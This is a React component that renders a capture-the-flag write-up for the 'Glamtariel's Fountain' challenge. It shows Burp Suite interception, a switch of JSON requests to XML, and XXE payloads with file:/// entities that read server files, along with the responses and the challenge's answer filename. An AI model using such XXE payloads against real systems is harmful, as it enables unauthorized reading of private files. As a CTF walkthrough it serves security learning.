import ChallengeSummary from "../ChallengeSummary";
import {Accordion, AccordionDetails} from "@mui/material";
import {ChallengeDetails, Content, ContentImage, Pop, StyledSyntaxHighligher, TerminalPrompt} from "../Common";
import QuoteCard from "../QuoteCard";
import characters from "../characters";
import React from "react";

function GlamTarielsFountain() {
  return (
    <Accordion>
      <ChallengeSummary title={"Glamtariel's Fountain"} difficulty={4}/>
      <AccordionDetails>
        <ChallengeDetails>
          Stare into Glamtariel's fountain and see if you can find the ring! What is the filename of the ring she presents you? Talk to Hal Tandybuck in the Web Ring for hints.
        </ChallengeDetails>
        <Content>
          Once inside <Pop>Boria Mine</Pop>, we see <Pop>Akbowl</Pop> who has the following to say:
        </Content>
        <QuoteCard
          character={characters.akbowl}
          quote={0}
        />
        <Content>
          Clicking the fountain takes us to <a
          href="https://glamtarielsfountain.com/">https://glamtarielsfountain.com/</a>:
        </Content>
        <ContentImage src={"images/glam_1.png"}/>
        <Content>
          Clicking around a bit, it seems like this is some kind of drag and drop game where you drag items around to
          advance the
          game. Taking a quick peak at the network traffic, it appears that when we drag and drop an item, we execute
          a <Pop>POST</Pop> request
          with a <Pop>json</Pop> payload that looks like:
        </Content>
        <StyledSyntaxHighligher language={"json"}>
          {
            `{"imgDrop":"img4","who":"fountain","reqType":"json"}`
          }
        </StyledSyntaxHighligher>
        <Content>
          After dragging several objects and observing the responses, we gather a list of a few keywords that were in
          all caps:
        </Content>
        <StyledSyntaxHighligher>
          {
            `PATH
TAMPER
TRAFFIC FLIES
TYPE
RINGLIST
APP`
          }
        </StyledSyntaxHighligher>
        <Content>
          One of the responses was particularly interesting:
        </Content>
        <TerminalPrompt>
          You know, I've heard Gamtariel talk in her sleep about rings using a different TYPE of language. She may be
          more
          responsive about them if you ask differently.
        </TerminalPrompt>
        <Content>
          As we observed in our network traffic, we are sending <Pop>json</Pop> data, and specifying in
          our <Pop>json</Pop> payload
          that it is <Pop>json</Pop>. Let's try modifying this to <Pop>XML</Pop>.
        </Content>
        <Content>
          We can use the proxy interceptor in <Pop>burpsuite</Pop> to modify the request and change the conversation
          to <Pop>XML</Pop>. First we need
          to start interceptor, and then drag and drop an item. Interceptor will capture the traffic and we will then
          modify it.
          We will need to modify both the <Pop>reqType</Pop> entry in our payload, as well as
          the <Pop>Content-Type</Pop> header:
        </Content>
        <ContentImage src={"images/glam_2.png"}/>
        <Content>
          Sending the request results in a successful response:
        </Content>
        <ContentImage src={"images/glam_3.png"}/>
        <Content>
          Since we received a hint about <Pop>XXE</Pop> exploits, let's try poking around to see if we can find
          the <Pop>RINGLIST</Pop> that was
          mentioned.
        </Content>
        <ContentImage src={"images/glam_4.png"}/>
        <Content>
          We can see in the response that we were successful, and visiting the link gives us a glimpse at the secrets:
        </Content>
        <ContentImage src={"images/glam_5.png"}/>
        <Content>
          We can see a potential new path to explore: <Pop>x_phial_pholder_2022</Pop> and several files within that seem
          to be text files
          referencing different colored rings. We can modify our <Pop>XXE</Pop> exploit to explore these files. We get
          good results, but
          no useful information when we check out <Pop>redring.txt</Pop> and <Pop>bluering.txt</Pop>. Trying
          out <Pop>silverring.txt</Pop> however gives us
          a new result:
        </Content>
        <StyledSyntaxHighligher language={"xml"}>
          {
            `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt" >]>
<a>
    <reqType>xml</reqType>
    <imgDrop>&xxe;</imgDrop>
    <who>princess</who>
</a>`
          }
        </StyledSyntaxHighligher>
        <StyledSyntaxHighligher language={"json"}>
          {
            `{
  "appResp": "I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!",
  "droppedOn": "none",
  "visit": "static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px"
}`
          }
        </StyledSyntaxHighligher>
        <Content>
          Visiting the new link gives us a red ring with <Pop>goldring_to_be_deleted.txt</Pop> inscribed on it:
        </Content>
        <ContentImage src={"images/glam_6.png"}/>
        <Content>
          Checking out this new file with our <Pop>XXE</Pop> exploit gives us a cryptic response:
        </Content>
        <TerminalPrompt>
          Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty
          bold
          REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to
          discuss
          them.^She's definitely hiding something.
        </TerminalPrompt>
        <Content>
          Since there seems to be a strong hint towards <Pop>reqType</Pop>, let's move our <Pop>XXE</Pop> inject into
          that field:
        </Content>
        <StyledSyntaxHighligher language={"xml"}>
          {
            `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt" >]>
<a>
    <reqType>&xxe;</reqType>
    <imgDrop>img1</imgDrop>
    <who>princess</who>
</a>`
          }
        </StyledSyntaxHighligher>
        <Content>
          This produces the following resonse:
        </Content>
        <StyledSyntaxHighligher language={"json"}>
          {
            `{
  "appResp": "No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!",
  "droppedOn": "none",
  "visit": "static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px"
}`
          }
        </StyledSyntaxHighligher>
        <Content>
          This yields us the coveted gold ring, and our answer for this challenge is the
          filename: <Pop>goldring-morethansupertopsecret76394734.png</Pop>
        </Content>
        <ContentImage src={"images/glam_7.png"}/>
        <Content>
          Once complete, here's what <Pop>Akbowl</Pop> has to say:
        </Content>
        <QuoteCard
          character={characters.akbowl}
          quote={1}
        />
        <Content>
          Completing this ring once again summons <Pop>Grinchum</Pop>, who has this to say:
        </Content>
        <QuoteCard
          character={characters.grinchum}
          quote={2}
        />
      </AccordionDetails>
    </Accordion>
  )
}

export default GlamTarielsFountain
